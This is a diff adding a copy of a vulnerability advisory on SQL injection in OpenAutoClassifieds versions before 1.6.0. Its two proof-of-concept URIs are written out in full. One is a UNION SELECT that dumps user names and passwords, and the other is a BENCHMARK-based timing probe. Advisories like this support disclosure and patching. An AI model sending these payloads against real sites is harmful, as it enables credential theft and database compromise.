@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/36173/info
+
+OpenAutoClassifieds is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+Versions prior to OpenAutoClassifieds 1.6.0 are vulnerable.
+
+The following proof-of-concept URIs are available:
+
+http://www.example.com/openauto/xml_zone_data.php?filter=1%20union%20select%20concat(0x0a,user,0x3a,pass,0x3a,0x0a)%20from%20users
+
+http://www.example.com/openauto/listings.php?min-price=&max_price=&start_zip=BENCHMARK(1000000,MD5(1))&zip_range=10000&state=Illinois&submit=Search&vehicle_type=&make=&model=&year=&listing_condition=&trans=&drive_train=&sellerid= 
